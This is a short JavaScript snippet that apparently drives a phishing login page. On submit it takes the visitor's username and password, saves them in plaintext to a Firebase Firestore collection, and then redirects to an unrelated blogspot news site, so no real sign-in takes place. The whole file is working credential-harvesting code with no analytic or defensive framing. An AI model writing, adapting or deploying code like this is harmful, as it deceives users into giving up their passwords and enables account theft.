
document.addEventListener('DOMContentLoaded', function() {
  const form = document.querySelector('#form');

  // Initialize Firebase
  try {
    let app = firebase.app();
    let features = ['firestore'].filter(feature => typeof app[feature] === 'function');

    // Initialize Firestore
    const db = firebase.firestore();

    // Handle form submission
    form.addEventListener('submit', function(e) {
      e.preventDefault();

      const username = document.getElementById('username').value;
      const userpassword = document.getElementById('userpassword').value;

      // Save data to Firestore
      db.collection('formData').add({
        UserName: username,
        Password: userpassword,
        TimeStamp: firebase.firestore.FieldValue.serverTimestamp()
      })
      .then(() => {
        form.reset();
        location.href = 'https://bongotznewsandudaku.blogspot.com';
      })
      .catch((error) => {
        console.error("Error writing document: ", error);
      });
    });
  } catch (e) {
    console.error(e);
  }
});
